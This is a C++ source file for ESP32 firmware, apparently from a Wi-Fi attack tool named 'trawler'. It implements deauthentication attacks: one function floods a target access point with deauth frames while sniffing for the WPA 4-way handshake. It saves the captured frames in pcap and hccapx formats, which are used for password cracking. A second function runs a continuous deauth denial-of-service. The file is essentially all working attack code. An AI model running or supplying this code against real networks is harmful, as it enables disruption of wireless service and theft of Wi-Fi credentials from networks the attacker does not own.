/**
 * @file attack_wifi.cpp
 * @auther adventune
 * @date 2023-09-28
 * @copyright Copyright (C) 2023
 *
 * @brief Implements wifi based attacks
 **/

#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"
#include "sniffer.h"
#include "wsl_bypasser.h"
#include <cstring>

#include "attack_wifi.h"
#include "attack.h"

static const char *TAG = "trawler_attack_wifi";

static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGI(TAG, "Got EAPoL-Key frame");
    ESP_LOGD(TAG, "Processing handshake frame...");
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;

    AttackManager::AppendStatusContent(frame->payload, frame->rx_ctrl.sig_len);
    printf("frame->payload: %s\n", frame->payload);
    pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
    hccapx_serializer_add_frame((data_frame_t *) frame->payload);
}

/**
 * @brief Starts deauth attack. Should not be used directly, use AttackManager instead
 * @details Starts deauth attack, sends deauth packets to the target and sniffs for 4-way handshake.
 *
 * @return attack_errors_t
 */
attack_errors_t attack_wifi_start_handshake() {
    int deauth_interval_seconds = 15;

    ESP_LOGI(TAG, "Starting de-auth attack");

    const wifi_ap_record_t *ap_record = AttackManager::current_wifi_config.ap_record;

    pcap_serializer_init();
    hccapx_serializer_init(ap_record->ssid, strlen((char *) ap_record->ssid));

    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);

    ESP_ERROR_CHECK(
            esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler,
                                       nullptr));

    if (AttackManager::current_wifi_config.type == DEAUTH) {
        wsl_bypasser_init_deauth(ap_record, deauth_interval_seconds);
    }

    return ATTACK_ERROR_NONE;
}

attack_errors_t attack_wifi_stop_handshake() {
    if (AttackManager::current_wifi_config.type == DEAUTH) {
        wsl_bypasser_reset_deauth();
    }
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();

    ESP_LOGI(TAG, "Handshake attack stopped");

    return ATTACK_ERROR_NONE;
}

attack_errors_t attack_wifi_start_dos() {
    // Repeatedly send deauth packets (no need for sniffing)

    const wifi_ap_record_t *ap_record = AttackManager::current_wifi_config.ap_record;

    int deauth_period_sec = 5;

    wsl_bypasser_init_deauth(ap_record, deauth_period_sec);
    return ATTACK_ERROR_NONE;
}

attack_errors_t attack_wifi_stop_dos() {
    // Stop sending deauth packets
    wsl_bypasser_reset_deauth();
    return ATTACK_ERROR_NONE;
}